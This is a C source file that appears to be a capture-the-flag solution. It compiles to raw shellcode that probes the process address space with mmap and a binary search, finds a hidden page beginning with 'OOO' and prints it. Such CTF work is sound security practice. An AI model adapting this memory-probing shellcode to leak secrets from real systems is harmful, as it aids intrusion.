// This is an example of turning simple C into raw shellcode.

// make shellcode.bin will compile to assembly
// make shellcode.bin.pkt will prepend the length so you can
//    ./know_your_mem < shellcode.bin.pkt

// Note: Right now the 'build' does not support .(ro)data
//       If you want them you'll have to adjust the Makefile.
//       They're not really necessary to solve this challenge though.


// From https://chromium.googlesource.com/linux-syscall-support/
static int my_errno = 0;
#define SYS_ERRNO my_errno
#include "linux-syscall-support/linux_syscall_support.h"

#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL
#define PROT_READ  1
#define PROT_WRITE 2
#define MAP_ANONYMOUS 32
#define MAP_PRIVATE 2
#define MAP_FAILED 0xffffffffffffffffUL
#define MAX_SIZE 0x4000000

__asm__("jmp _start");

long long search(long long left, long long right) {
    long long length = right - left;
    void *p = sys_mmap((void *)left, length, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    long long ret = 0;
    if (p == MAP_FAILED) {
        return 0;
    }
    sys_munmap(p, length);
    if (p != (void *)left) {
        if (length == 0x1000) {
            char *str = left;
            if (str[0] == 'O' && str[1] == 'O' && str[2] == 'O') {
                sys_write(1, str, 0x100);
                ret = left;
            } else {
                ret = 0;
            }
        } else {
            ret |= search(left, (left + right) / 2);
            ret |= search((left + right) / 2, right);
        }
    }
    return ret;
}

long long _start()
{
    long long ret = 0;
    for (long long addr = ADDR_MIN; addr < 2 * ADDR_MIN; addr += MAX_SIZE) {
        void *p = sys_mmap(addr, MAX_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        if (p == MAP_FAILED) {
            continue;
        }
        sys_munmap(p, MAX_SIZE);
        if (p != addr) {
            ret |= search(addr, (2 * addr + MAX_SIZE) / 2);
            ret |= search((2 * addr + MAX_SIZE) / 2, addr + MAX_SIZE);
        }
    }

    return ret;

    // sys_write(1, __builtin_frame_address(0), 5);  // Prints something (note: best avoid literals)
    // sys_exit_group(2);                            // Exit
}
